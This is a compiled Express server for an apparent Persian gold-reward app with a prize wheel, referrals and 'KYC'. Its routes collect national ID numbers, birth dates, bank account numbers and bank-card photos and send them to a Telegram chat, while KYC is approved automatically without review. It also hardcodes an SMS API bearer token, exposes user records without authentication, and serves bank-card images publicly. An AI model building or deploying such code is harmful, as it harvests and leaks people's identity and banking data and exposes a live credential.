var __defProp = Object.defineProperty;
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};

// server/index-prod.ts
import fs2 from "node:fs";
import path2 from "node:path";
import express3 from "express";

// server/app.ts
import express2 from "express";

// server/routes.ts
import { createServer } from "http";
import express from "express";
import multer from "multer";
import axios from "axios";
import TelegramBot from "node-telegram-bot-api";

// shared/schema.ts
var schema_exports = {};
__export(schema_exports, {
  insertKycSchema: () => insertKycSchema,
  insertOtpSchema: () => insertOtpSchema,
  insertReferralSchema: () => insertReferralSchema,
  insertTransactionSchema: () => insertTransactionSchema,
  insertUserSchema: () => insertUserSchema,
  insertWheelSpinSchema: () => insertWheelSpinSchema,
  kycVerifications: () => kycVerifications,
  kycVerificationsRelations: () => kycVerificationsRelations,
  otpCodes: () => otpCodes,
  referrals: () => referrals,
  referralsRelations: () => referralsRelations,
  transactions: () => transactions,
  transactionsRelations: () => transactionsRelations,
  users: () => users,
  usersRelations: () => usersRelations,
  wheelSpins: () => wheelSpins,
  wheelSpinsRelations: () => wheelSpinsRelations
});
import { sqliteTable, text, integer, real } from "drizzle-orm/sqlite-core";
import { relations } from "drizzle-orm";
import { z } from "zod";
var users = sqliteTable("users", {
  id: text("id").primaryKey(),
  phoneNumber: text("phone_number").notNull().unique(),
  firstName: text("first_name").notNull(),
  lastName: text("last_name").notNull(),
  nationalId: text("national_id").notNull().unique(),
  birthDate: text("birth_date"),
  // YYYY-MM-DD format
  goldBalance: real("gold_balance").notNull().default(0),
  // Sut
  tomanBalance: real("toman_balance").notNull().default(0),
  referralCode: text("referral_code").notNull().unique(),
  referredBy: text("referred_by"),
  isKycVerified: integer("is_kyc_verified", { mode: "boolean" }).notNull().default(false),
  createdAt: integer("created_at").notNull()
});
var otpCodes = sqliteTable("otp_codes", {
  id: text("id").primaryKey(),
  phoneNumber: text("phone_number").notNull(),
  code: text("code").notNull(),
  expiresAt: integer("expires_at").notNull(),
  isVerified: integer("is_verified", { mode: "boolean" }).notNull().default(false),
  createdAt: integer("created_at").notNull()
});
var kycVerifications = sqliteTable("kyc_verifications", {
  id: text("id").primaryKey(),
  userId: text("user_id").notNull().references(() => users.id, { onDelete: "cascade" }),
  bankAccountNumber: text("bank_account_number").notNull(),
  bankCardImageUrl: text("bank_card_image_url").notNull(),
  status: text("status").notNull().default("pending"),
  // pending, approved, rejected
  submittedAt: integer("submitted_at").notNull()
});
var wheelSpins = sqliteTable("wheel_spins", {
  id: text("id").primaryKey(),
  userId: text("user_id").notNull().references(() => users.id, { onDelete: "cascade" }),
  prizeAmount: real("prize_amount").notNull(),
  // 0 for empty slot
  spunAt: integer("spun_at").notNull()
});
var transactions = sqliteTable("transactions", {
  id: text("id").primaryKey(),
  userId: text("user_id").notNull().references(() => users.id, { onDelete: "cascade" }),
  type: text("type").notNull(),
  // sell_gold, buy_gold, wheel_prize, referral_bonus, withdrawal
  goldAmount: real("gold_amount"),
  tomanAmount: real("toman_amount"),
  description: text("description"),
  createdAt: integer("created_at").notNull()
});
var referrals = sqliteTable("referrals", {
  id: text("id").primaryKey(),
  referrerId: text("referrer_id").notNull().references(() => users.id, { onDelete: "cascade" }),
  referredUserId: text("referred_user_id").notNull().references(() => users.id, { onDelete: "cascade" }),
  isVerified: integer("is_verified", { mode: "boolean" }).notNull().default(false),
  // True when referred user completes KYC
  bonusPaid: integer("bonus_paid", { mode: "boolean" }).notNull().default(false),
  createdAt: integer("created_at").notNull()
});
var usersRelations = relations(users, ({ many }) => ({
  kycVerifications: many(kycVerifications),
  wheelSpins: many(wheelSpins),
  transactions: many(transactions),
  referralsMade: many(referrals, { relationName: "referrer" }),
  referralsReceived: many(referrals, { relationName: "referred" })
}));
var kycVerificationsRelations = relations(kycVerifications, ({ one }) => ({
  user: one(users, {
    fields: [kycVerifications.userId],
    references: [users.id]
  })
}));
var wheelSpinsRelations = relations(wheelSpins, ({ one }) => ({
  user: one(users, {
    fields: [wheelSpins.userId],
    references: [users.id]
  })
}));
var transactionsRelations = relations(transactions, ({ one }) => ({
  user: one(users, {
    fields: [transactions.userId],
    references: [users.id]
  })
}));
var referralsRelations = relations(referrals, ({ one }) => ({
  referrer: one(users, {
    fields: [referrals.referrerId],
    references: [users.id],
    relationName: "referrer"
  }),
  referredUser: one(users, {
    fields: [referrals.referredUserId],
    references: [users.id],
    relationName: "referred"
  })
}));
var insertUserSchema = z.object({
  phoneNumber: z.string().regex(/^09\d{9}$/, "\u0634\u0645\u0627\u0631\u0647 \u062A\u0644\u0641\u0646 \u0628\u0627\u06CC\u062F \u0628\u0627 09 \u0634\u0631\u0648\u0639 \u0634\u0648\u062F \u0648 11 \u0631\u0642\u0645 \u0628\u0627\u0634\u062F"),
  nationalId: z.string().regex(/^\d{10}$/, "\u06A9\u062F \u0645\u0644\u06CC \u0628\u0627\u06CC\u062F 10 \u0631\u0642\u0645 \u0628\u0627\u0634\u062F"),
  firstName: z.string().min(2, "\u0646\u0627\u0645 \u0628\u0627\u06CC\u062F \u062D\u062F\u0627\u0642\u0644 2 \u062D\u0631\u0641 \u0628\u0627\u0634\u062F"),
  lastName: z.string().min(2, "\u0646\u0627\u0645 \u062E\u0627\u0646\u0648\u0627\u062F\u06AF\u06CC \u0628\u0627\u06CC\u062F \u062D\u062F\u0627\u0642\u0644 2 \u062D\u0631\u0641 \u0628\u0627\u0634\u062F"),
  birthDate: z.string().optional(),
  referralCode: z.string(),
  referredBy: z.string().optional().nullable()
});
var insertOtpSchema = z.object({
  phoneNumber: z.string().regex(/^09\d{9}$/),
  code: z.string().length(4)
});
var insertKycSchema = z.object({
  userId: z.string(),
  bankAccountNumber: z.string().min(10, "\u0634\u0645\u0627\u0631\u0647 \u062D\u0633\u0627\u0628 \u0646\u0627\u0645\u0639\u062A\u0628\u0631 \u0627\u0633\u062A").max(20),
  bankCardImageUrl: z.string()
});
var insertWheelSpinSchema = z.object({
  userId: z.string(),
  prizeAmount: z.number()
});
var insertTransactionSchema = z.object({
  userId: z.string(),
  type: z.string(),
  goldAmount: z.number().optional(),
  tomanAmount: z.number().optional(),
  description: z.string().optional()
});
var insertReferralSchema = z.object({
  referrerId: z.string(),
  referredUserId: z.string()
});

// server/db.ts
import { drizzle } from "drizzle-orm/better-sqlite3";
import Database from "better-sqlite3";
console.log("\u{1F4CA} Using SQLite for database...");
var sqlite = new Database("dev.db");
sqlite.pragma("journal_mode = WAL");
var db = drizzle({ client: sqlite, schema: schema_exports });

// server/storage.ts
import { eq, and, desc, gte } from "drizzle-orm";
import { randomBytes } from "crypto";
import { v4 as uuidv4 } from "uuid";
var DatabaseStorage = class {
  // User operations
  async getUser(id) {
    const [user] = await db.select().from(users).where(eq(users.id, id));
    return user || void 0;
  }
  async getUserByPhone(phoneNumber) {
    const [user] = await db.select().from(users).where(eq(users.phoneNumber, phoneNumber));
    return user || void 0;
  }
  async getUserByNationalId(nationalId) {
    const [user] = await db.select().from(users).where(eq(users.nationalId, nationalId));
    return user || void 0;
  }
  async createUser(insertUser) {
    const [user] = await db.insert(users).values({
      ...insertUser,
      id: uuidv4(),
      createdAt: Date.now()
    }).returning();
    return user;
  }
  async updateUserBalance(userId, goldDelta, tomanDelta) {
    const [user] = await db.select().from(users).where(eq(users.id, userId));
    if (!user) throw new Error("User not found");
    const newGold = parseFloat(user.goldBalance) + goldDelta;
    const newToman = parseFloat(user.tomanBalance) + tomanDelta;
    await db.update(users).set({
      goldBalance: newGold.toString(),
      tomanBalance: newToman.toString()
    }).where(eq(users.id, userId));
  }
  async updateUserBirthDate(userId, birthDate) {
    await db.update(users).set({ birthDate }).where(eq(users.id, userId));
  }
  async markUserKycVerified(userId) {
    await db.update(users).set({ isKycVerified: true }).where(eq(users.id, userId));
  }
  // OTP operations
  async createOtpCode(insertOtp) {
    const [otp] = await db.insert(otpCodes).values({
      ...insertOtp,
      id: uuidv4(),
      expiresAt: insertOtp.expiresAt.getTime(),
      createdAt: Date.now()
    }).returning();
    return otp;
  }
  async getLatestOtp(phoneNumber) {
    const [otp] = await db.select().from(otpCodes).where(eq(otpCodes.phoneNumber, phoneNumber)).orderBy(desc(otpCodes.createdAt)).limit(1);
    return otp || void 0;
  }
  async markOtpVerified(id) {
    await db.update(otpCodes).set({ isVerified: true }).where(eq(otpCodes.id, id));
  }
  // KYC operations
  async createKycVerification(insertKyc) {
    const [kyc] = await db.insert(kycVerifications).values({
      ...insertKyc,
      id: uuidv4(),
      submittedAt: Date.now()
    }).returning();
    return kyc;
  }
  async getKycByUserId(userId) {
    const [kyc] = await db.select().from(kycVerifications).where(eq(kycVerifications.userId, userId)).orderBy(desc(kycVerifications.submittedAt)).limit(1);
    return kyc || void 0;
  }
  // Wheel spin operations
  async createWheelSpin(insertSpin) {
    const [spin] = await db.insert(wheelSpins).values({
      ...insertSpin,
      id: uuidv4(),
      spunAt: Date.now()
    }).returning();
    return spin;
  }
  async getTodayWheelSpin(userId) {
    const today = /* @__PURE__ */ new Date();
    today.setHours(0, 0, 0, 0);
    const todayTimestamp = today.getTime();
    const [spin] = await db.select().from(wheelSpins).where(
      and(
        eq(wheelSpins.userId, userId),
        gte(wheelSpins.spunAt, todayTimestamp)
      )
    ).orderBy(desc(wheelSpins.spunAt)).limit(1);
    return spin || void 0;
  }
  // Transaction operations
  async createTransaction(insertTransaction) {
    const [transaction] = await db.insert(transactions).values({
      ...insertTransaction,
      id: uuidv4(),
      createdAt: Date.now()
    }).returning();
    return transaction;
  }
  async getUserTransactions(userId) {
    return await db.select().from(transactions).where(eq(transactions.userId, userId)).orderBy(desc(transactions.createdAt)).limit(50);
  }
  // Referral operations
  async createReferral(insertReferral) {
    const [referral] = await db.insert(referrals).values({
      ...insertReferral,
      id: uuidv4(),
      createdAt: Date.now()
    }).returning();
    return referral;
  }
  async getUserReferrals(userId) {
    return await db.select({
      id: referrals.id,
      referrerId: referrals.referrerId,
      referredUserId: referrals.referredUserId,
      isVerified: referrals.isVerified,
      bonusPaid: referrals.bonusPaid,
      createdAt: referrals.createdAt,
      referredUser: {
        id: users.id,
        firstName: users.firstName,
        lastName: users.lastName,
        phoneNumber: users.phoneNumber
      }
    }).from(referrals).leftJoin(users, eq(referrals.referredUserId, users.id)).where(eq(referrals.referrerId, userId)).orderBy(desc(referrals.createdAt));
  }
  async getVerifiedReferralCount(userId) {
    const result = await db.select().from(referrals).where(
      and(
        eq(referrals.referrerId, userId),
        eq(referrals.isVerified, true)
      )
    );
    return result.length;
  }
  async markReferralVerified(referralId) {
    await db.update(referrals).set({ isVerified: true }).where(eq(referrals.id, referralId));
  }
  async getUserByReferralCode(referralCode) {
    const [user] = await db.select().from(users).where(eq(users.referralCode, referralCode));
    return user || void 0;
  }
};
function generateReferralCode() {
  return randomBytes(4).toString("hex").toUpperCase();
}
var storage = new DatabaseStorage();

// server/routes.ts
import path from "path";
import fs from "fs/promises";
var upload = multer({
  storage: multer.diskStorage({
    destination: async (req, file, cb) => {
      const uploadDir = path.join(process.cwd(), "uploads");
      await fs.mkdir(uploadDir, { recursive: true });
      cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
      const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
      cb(null, file.fieldname + "-" + uniqueSuffix + path.extname(file.originalname));
    }
  }),
  limits: { fileSize: 5 * 1024 * 1024 }
  // 5MB limit
});
var TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
var TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
var bot = null;
if (TELEGRAM_BOT_TOKEN) {
  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
}
async function sendToTelegram(message, photoPath) {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log("Telegram bot not configured");
    return;
  }
  try {
    if (photoPath) {
      await bot.sendPhoto(TELEGRAM_CHAT_ID, photoPath, { caption: message });
    } else {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message);
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error);
  }
}
var SMS_API_URL = "https://s.api.ir/api/sw1/SmsOTP";
var SMS_API_TOKEN = process.env.SMS_API_TOKEN || "VfxfZubrWy+glyAHX0adMkshsGBfdbFjzQ/4KeTNVJnCIAH/3maggFMMHvIqCAkiRdzMMf+H7MjaCu8gJ9zhxTYvecNnGSaJxnpy6cre48M=";
async function sendOtpSms(phoneNumber, code) {
  try {
    await axios.post(
      SMS_API_URL,
      {
        code,
        mobile: phoneNumber,
        template: 0
      },
      {
        headers: {
          "accept": "text/plain",
          "Authorization": `Bearer ${SMS_API_TOKEN}`,
          "Content-Type": "application/json"
        }
      }
    );
  } catch (error) {
    console.error("Error sending OTP SMS:", error.response?.data || error.message);
    throw new Error("\u0627\u0631\u0633\u0627\u0644 \u067E\u06CC\u0627\u0645\u06A9 \u0628\u0627 \u062E\u0637\u0627 \u0645\u0648\u0627\u062C\u0647 \u0634\u062F");
  }
}
var WHEEL_PRIZES = [50, 100, 500, 1e3, 5e3, 1e4, 5e4, 0];
function getRandomPrize() {
  return WHEEL_PRIZES[Math.floor(Math.random() * WHEEL_PRIZES.length)];
}
async function registerRoutes(app2) {
  app2.use("/uploads", express.static(path.join(process.cwd(), "uploads")));
  app2.post("/api/auth/send-otp", async (req, res) => {
    try {
      const { phoneNumber } = req.body;
      if (!phoneNumber || !/^09\d{9}$/.test(phoneNumber)) {
        return res.status(400).json({ message: "\u0634\u0645\u0627\u0631\u0647 \u062A\u0644\u0641\u0646 \u0646\u0627\u0645\u0639\u062A\u0628\u0631 \u0627\u0633\u062A" });
      }
      const code = Math.floor(1e3 + Math.random() * 9e3).toString();
      const expiresAt = new Date(Date.now() + 5 * 60 * 1e3);
      await storage.createOtpCode({
        phoneNumber,
        code,
        expiresAt
      });
      await sendOtpSms(phoneNumber, code);
      res.json({ success: true, message: "\u06A9\u062F \u062A\u0627\u06CC\u06CC\u062F \u0627\u0631\u0633\u0627\u0644 \u0634\u062F" });
    } catch (error) {
      console.error("Send OTP error:", error);
      res.status(500).json({ message: error.message || "\u062E\u0637\u0627 \u062F\u0631 \u0627\u0631\u0633\u0627\u0644 \u06A9\u062F" });
    }
  });
  app2.post("/api/auth/verify-otp", async (req, res) => {
    try {
      const { phoneNumber, code } = req.body;
      const otp = await storage.getLatestOtp(phoneNumber);
      if (!otp) {
        return res.status(400).json({ message: "\u06A9\u062F\u06CC \u0628\u0631\u0627\u06CC \u0627\u06CC\u0646 \u0634\u0645\u0627\u0631\u0647 \u06CC\u0627\u0641\u062A \u0646\u0634\u062F" });
      }
      if (otp.isVerified) {
        return res.status(400).json({ message: "\u0627\u06CC\u0646 \u06A9\u062F \u0642\u0628\u0644\u0627\u064B \u0627\u0633\u062A\u0641\u0627\u062F\u0647 \u0634\u062F\u0647 \u0627\u0633\u062A" });
      }
      if (/* @__PURE__ */ new Date() > otp.expiresAt) {
        return res.status(400).json({ message: "\u06A9\u062F \u0645\u0646\u0642\u0636\u06CC \u0634\u062F\u0647 \u0627\u0633\u062A" });
      }
      if (otp.code !== code) {
        return res.status(400).json({ message: "\u06A9\u062F \u0648\u0627\u0631\u062F \u0634\u062F\u0647 \u0635\u062D\u06CC\u062D \u0646\u06CC\u0633\u062A" });
      }
      await storage.markOtpVerified(otp.id);
      res.json({ success: true, message: "\u062A\u0627\u06CC\u06CC\u062F \u0645\u0648\u0641\u0642" });
    } catch (error) {
      console.error("Verify OTP error:", error);
      res.status(500).json({ message: "\u062E\u0637\u0627 \u062F\u0631 \u062A\u0627\u06CC\u06CC\u062F \u06A9\u062F" });
    }
  });
  app2.post("/api/auth/register", async (req, res) => {
    try {
      const { phoneNumber, firstName, lastName, nationalId, referralCode: inputReferralCode } = req.body;
      const otp = await storage.getLatestOtp(phoneNumber);
      if (!otp || !otp.isVerified) {
        return res.status(400).json({ message: "\u0644\u0637\u0641\u0627\u064B \u0627\u0628\u062A\u062F\u0627 \u0634\u0645\u0627\u0631\u0647 \u062A\u0644\u0641\u0646 \u0631\u0627 \u062A\u0627\u06CC\u06CC\u062F \u06A9\u0646\u06CC\u062F" });
      }
      const existingUser = await storage.getUserByPhone(phoneNumber);
      if (existingUser) {
        return res.json({ userId: existingUser.id, message: "\u0634\u0645\u0627 \u0642\u0628\u0644\u0627\u064B \u062B\u0628\u062A \u0646\u0627\u0645 \u06A9\u0631\u062F\u0647\u200C\u0627\u06CC\u062F" });
      }
      const existingNationalId = await storage.getUserByNationalId(nationalId);
      if (existingNationalId) {
        return res.status(400).json({ message: "\u0627\u06CC\u0646 \u06A9\u062F \u0645\u0644\u06CC \u0642\u0628\u0644\u0627\u064B \u0627\u0633\u062A\u0641\u0627\u062F\u0647 \u0634\u062F\u0647 \u0627\u0633\u062A" });
      }
      let userReferralCode = generateReferralCode();
      while (await storage.getUserByReferralCode(userReferralCode)) {
        userReferralCode = generateReferralCode();
      }
      const user = await storage.createUser({
        phoneNumber,
        firstName,
        lastName,
        nationalId,
        referralCode: userReferralCode,
        referredBy: inputReferralCode || null
      });
      if (inputReferralCode) {
        const referrer = await storage.getUserByReferralCode(inputReferralCode);
        if (referrer) {
          await storage.createReferral({
            referrerId: referrer.id,
            referredUserId: user.id
          });
        }
      }
      await sendToTelegram(
        `\u{1F195} \u06A9\u0627\u0631\u0628\u0631 \u062C\u062F\u06CC\u062F \u062B\u0628\u062A \u0646\u0627\u0645 \u06A9\u0631\u062F:

\u0646\u0627\u0645: ${firstName} ${lastName}
\u0634\u0645\u0627\u0631\u0647 \u062A\u0644\u0641\u0646: ${phoneNumber}
\u06A9\u062F \u0645\u0644\u06CC: ${nationalId}
\u06A9\u062F \u0645\u0639\u0631\u0641: ${userReferralCode}
\u0645\u0639\u0631\u0641 \u0634\u062F\u0647 \u062A\u0648\u0633\u0637: ${inputReferralCode || "\u0646\u062F\u0627\u0631\u062F"}`
      );
      res.json({ userId: user.id, message: "\u062B\u0628\u062A \u0646\u0627\u0645 \u0628\u0627 \u0645\u0648\u0641\u0642\u06CC\u062A \u0627\u0646\u062C\u0627\u0645 \u0634\u062F" });
    } catch (error) {
      console.error("Register error:", error);
      res.status(500).json({ message: "\u062E\u0637\u0627 \u062F\u0631 \u062B\u0628\u062A \u0646\u0627\u0645" });
    }
  });
  app2.get("/api/user/:userId?", async (req, res) => {
    try {
      const userId = req.params.userId || req.query.userId;
      if (!userId) {
        return res.status(400).json({ message: "\u0634\u0646\u0627\u0633\u0647 \u06A9\u0627\u0631\u0628\u0631 \u0627\u0644\u0632\u0627\u0645\u06CC \u0627\u0633\u062A" });
      }
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "\u06A9\u0627\u0631\u0628\u0631 \u06CC\u0627\u0641\u062A \u0646\u0634\u062F" });
      }
      res.json(user);
    } catch (error) {
      console.error("Get user error:", error);
      res.status(500).json({ message: "\u062E\u0637\u0627 \u062F\u0631 \u062F\u0631\u06CC\u0627\u0641\u062A \u0627\u0637\u0644\u0627\u0639\u0627\u062A \u06A9\u0627\u0631\u0628\u0631" });
    }
  });
  app2.post("/api/kyc/submit", upload.single("bankCardImage"), async (req, res) => {
    try {
      const { userId, birthDate, bankAccountNumber } = req.body;
      const file = req.file;
      if (!file) {
        return res.status(400).json({ message: "\u0644\u0637\u0641\u0627\u064B \u0639\u06A9\u0633 \u06A9\u0627\u0631\u062A \u0628\u0627\u0646\u06A9\u06CC \u0631\u0627 \u0622\u067E\u0644\u0648\u062F \u06A9\u0646\u06CC\u062F" });
      }
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "\u06A9\u0627\u0631\u0628\u0631 \u06CC\u0627\u0641\u062A \u0646\u0634\u062F" });
      }
      await storage.updateUserBirthDate(userId, birthDate);
      const imageUrl = `/uploads/${file.filename}`;
      const kyc = await storage.createKycVerification({
        userId,
        bankAccountNumber,
        bankCardImageUrl: imageUrl
      });
      await storage.markUserKycVerified(userId);
      if (user.referredBy) {
        const referrer = await storage.getUserByReferralCode(user.referredBy);
        if (referrer) {
          const referrals2 = await storage.getUserReferrals(referrer.id);
          const referral = referrals2.find((r) => r.referredUserId === userId);
          if (referral && !referral.isVerified) {
            await storage.markReferralVerified(referral.id);
            await storage.updateUserBalance(referrer.id, 1e3, 0);
            await storage.createTransaction({
              userId: referrer.id,
              type: "referral_bonus",
              goldAmount: "1000",
              tomanAmount: null,
              description: `\u067E\u0627\u062F\u0627\u0634 \u0645\u0639\u0631\u0641\u06CC ${user.firstName} ${user.lastName}`
            });
            await sendToTelegram(
              `\u{1F4B0} \u067E\u0627\u062F\u0627\u0634 \u0645\u0639\u0631\u0641\u06CC:

${referrer.firstName} ${referrer.lastName} (${referrer.phoneNumber})
\u062F\u0631\u06CC\u0627\u0641\u062A \u06A9\u0631\u062F: 1,000 \u0633\u0648\u062A \u0637\u0644\u0627
\u0628\u0627\u0628\u062A \u0645\u0639\u0631\u0641\u06CC: ${user.firstName} ${user.lastName}`
            );
          }
        }
      }
      const photoPath = path.join(process.cwd(), "uploads", file.filename);
      await sendToTelegram(
        `\u2705 \u0627\u062D\u0631\u0627\u0632 \u0647\u0648\u06CC\u062A \u062C\u062F\u06CC\u062F:

\u0646\u0627\u0645: ${user.firstName} ${user.lastName}
\u06A9\u062F \u0645\u0644\u06CC: ${user.nationalId}
\u0634\u0645\u0627\u0631\u0647 \u062A\u0644\u0641\u0646: ${user.phoneNumber}
\u062A\u0627\u0631\u06CC\u062E \u062A\u0648\u0644\u062F: ${birthDate}
\u0634\u0645\u0627\u0631\u0647 \u062D\u0633\u0627\u0628: ${bankAccountNumber}`,
        photoPath
      );
      res.json({ success: true, message: "\u0627\u0637\u0644\u0627\u0639\u0627\u062A \u0627\u062D\u0631\u0627\u0632 \u0647\u0648\u06CC\u062A \u0627\u0631\u0633\u0627\u0644 \u0634\u062F" });
    } catch (error) {
      console.error("KYC submit error:", error);
      res.status(500).json({ message: "\u062E\u0637\u0627 \u062F\u0631 \u0627\u0631\u0633\u0627\u0644 \u0627\u0637\u0644\u0627\u0639\u0627\u062A" });
    }
  });
  app2.get("/api/wheel/can-spin/:userId?", async (req, res) => {
    try {
      const userId = req.params.userId || req.query.userId;
      if (!userId) {
        return res.status(400).json({ message: "\u0634\u0646\u0627\u0633\u0647 \u06A9\u0627\u0631\u0628\u0631 \u0627\u0644\u0632\u0627\u0645\u06CC \u0627\u0633\u062A" });
      }
      const todaySpin = await storage.getTodayWheelSpin(userId);
      res.json({
        canSpin: !todaySpin,
        lastSpin: todaySpin?.spunAt || null
      });
    } catch (error) {
      console.error("Can spin error:", error);
      res.status(500).json({ message: "\u062E\u0637\u0627 \u062F\u0631 \u0628\u0631\u0631\u0633\u06CC \u0648\u0636\u0639\u06CC\u062A \u06AF\u0631\u062F\u0648\u0646\u0647" });
    }
  });
  app2.post("/api/wheel/spin", async (req, res) => {
    try {
      const { userId } = req.body;
      const todaySpin = await storage.getTodayWheelSpin(userId);
      if (todaySpin) {
        return res.status(400).json({ message: "\u0634\u0645\u0627 \u0627\u0645\u0631\u0648\u0632 \u06AF\u0631\u062F\u0648\u0646\u0647 \u0631\u0627 \u0686\u0631\u062E\u0627\u0646\u062F\u0647\u200C\u0627\u06CC\u062F" });
      }
      const prize = getRandomPrize();
      await storage.createWheelSpin({
        userId,
        prizeAmount: prize.toString()
      });
      if (prize > 0) {
        await storage.updateUserBalance(userId, prize, 0);
        await storage.createTransaction({
          userId,
          type: "wheel_prize",
          goldAmount: prize.toString(),
          tomanAmount: null,
          description: `\u062C\u0627\u06CC\u0632\u0647 \u06AF\u0631\u062F\u0648\u0646\u0647 \u0634\u0627\u0646\u0633`
        });
      }
      const user = await storage.getUser(userId);
      await sendToTelegram(
        `\u{1F3B0} \u06AF\u0631\u062F\u0648\u0646\u0647 \u0634\u0627\u0646\u0633:

\u06A9\u0627\u0631\u0628\u0631: ${user?.firstName} ${user?.lastName}
\u062C\u0627\u06CC\u0632\u0647: ${prize > 0 ? `${prize.toLocaleString("fa-IR")} \u0633\u0648\u062A \u0637\u0644\u0627` : "\u062E\u0627\u0644\u06CC"}`
      );
      res.json({ prize, message: prize > 0 ? "\u062A\u0628\u0631\u06CC\u06A9!" : "\u0645\u062A\u0627\u0633\u0641\u06CC\u0645" });
    } catch (error) {
      console.error("Wheel spin error:", error);
      res.status(500).json({ message: "\u062E\u0637\u0627 \u062F\u0631 \u0686\u0631\u062E\u0627\u0646\u062F\u0646 \u06AF\u0631\u062F\u0648\u0646\u0647" });
    }
  });
  app2.post("/api/trading/sell", async (req, res) => {
    try {
      const { userId, goldAmount } = req.body;
      if (goldAmount <= 0) {
        return res.status(400).json({ message: "\u0645\u0642\u062F\u0627\u0631 \u0646\u0627\u0645\u0639\u062A\u0628\u0631 \u0627\u0633\u062A" });
      }
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "\u06A9\u0627\u0631\u0628\u0631 \u06CC\u0627\u0641\u062A \u0646\u0634\u062F" });
      }
      if (!user.isKycVerified) {
        return res.status(400).json({ message: "\u0627\u0628\u062A\u062F\u0627 \u0628\u0627\u06CC\u062F \u0627\u062D\u0631\u0627\u0632 \u0647\u0648\u06CC\u062A \u06A9\u0646\u06CC\u062F" });
      }
      const currentGold = parseFloat(user.goldBalance);
      if (currentGold < goldAmount) {
        return res.status(400).json({ message: "\u0645\u0648\u062C\u0648\u062F\u06CC \u0637\u0644\u0627 \u06A9\u0627\u0641\u06CC \u0646\u06CC\u0633\u062A" });
      }
      const GOLD_PRICE = 1e3;
      const tomanAmount = goldAmount * GOLD_PRICE;
      await storage.updateUserBalance(userId, -goldAmount, tomanAmount);
      await storage.createTransaction({
        userId,
        type: "sell_gold",
        goldAmount: (-goldAmount).toString(),
        tomanAmount: tomanAmount.toString(),
        description: `\u0641\u0631\u0648\u0634 ${goldAmount} \u0633\u0648\u062A \u0637\u0644\u0627`
      });
      await sendToTelegram(
        `\u{1F4C9} \u0641\u0631\u0648\u0634 \u0637\u0644\u0627:

\u06A9\u0627\u0631\u0628\u0631: ${user.firstName} ${user.lastName}
\u0641\u0631\u0648\u062E\u062A\u0647 \u0634\u062F: ${goldAmount.toLocaleString("fa-IR")} \u0633\u0648\u062A
\u062F\u0631\u06CC\u0627\u0641\u062A \u0634\u062F: ${tomanAmount.toLocaleString("fa-IR")} \u062A\u0648\u0645\u0627\u0646`
      );
      res.json({ success: true, tomanReceived: tomanAmount });
    } catch (error) {
      console.error("Sell gold error:", error);
      res.status(500).json({ message: "\u062E\u0637\u0627 \u062F\u0631 \u0641\u0631\u0648\u0634 \u0637\u0644\u0627" });
    }
  });
  app2.get("/api/transactions/:userId?", async (req, res) => {
    try {
      const userId = req.params.userId || req.query.userId;
      if (!userId) {
        return res.status(400).json({ message: "\u0634\u0646\u0627\u0633\u0647 \u06A9\u0627\u0631\u0628\u0631 \u0627\u0644\u0632\u0627\u0645\u06CC \u0627\u0633\u062A" });
      }
      const transactions2 = await storage.getUserTransactions(userId);
      res.json(transactions2);
    } catch (error) {
      console.error("Get transactions error:", error);
      res.status(500).json({ message: "\u062E\u0637\u0627 \u062F\u0631 \u062F\u0631\u06CC\u0627\u0641\u062A \u062A\u0631\u0627\u06A9\u0646\u0634\u200C\u0647\u0627" });
    }
  });
  app2.get("/api/referrals/:userId?", async (req, res) => {
    try {
      const userId = req.params.userId || req.query.userId;
      if (!userId) {
        return res.status(400).json({ message: "\u0634\u0646\u0627\u0633\u0647 \u06A9\u0627\u0631\u0628\u0631 \u0627\u0644\u0632\u0627\u0645\u06CC \u0627\u0633\u062A" });
      }
      const referrals2 = await storage.getUserReferrals(userId);
      res.json(referrals2);
    } catch (error) {
      console.error("Get referrals error:", error);
      res.status(500).json({ message: "\u062E\u0637\u0627 \u062F\u0631 \u062F\u0631\u06CC\u0627\u0641\u062A \u0644\u06CC\u0633\u062A \u0645\u0639\u0631\u0641\u06CC\u200C\u0647\u0627" });
    }
  });
  const httpServer = createServer(app2);
  return httpServer;
}

// server/app.ts
function log(message, source = "express") {
  const formattedTime = (/* @__PURE__ */ new Date()).toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
  });
  console.log(`${formattedTime} [${source}] ${message}`);
}
var app = express2();
app.use(express2.json({
  verify: (req, _res, buf) => {
    req.rawBody = buf;
  }
}));
app.use(express2.urlencoded({ extended: false }));
app.use((req, res, next) => {
  const start = Date.now();
  const path3 = req.path;
  let capturedJsonResponse = void 0;
  const originalResJson = res.json;
  res.json = function(bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };
  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path3.startsWith("/api")) {
      let logLine = `${req.method} ${path3} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }
      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "\u2026";
      }
      log(logLine);
    }
  });
  next();
});
async function runApp(setup) {
  const server = await registerRoutes(app);
  app.use((err, _req, res, _next) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";
    res.status(status).json({ message });
    throw err;
  });
  await setup(app, server);
  const port = parseInt(process.env.PORT || "5000", 10);
  const isDev = process.env.NODE_ENV === "development";
  const host = isDev ? "127.0.0.1" : "0.0.0.0";
  server.listen(port, host, () => {
    log(`serving on http://${host}:${port}`);
  });
}

// server/index-prod.ts
async function serveStatic(app2, _server) {
  const distPath = path2.resolve(import.meta.dirname, "public");
  if (!fs2.existsSync(distPath)) {
    throw new Error(
      `Could not find the build directory: ${distPath}, make sure to build the client first`
    );
  }
  app2.use(express3.static(distPath));
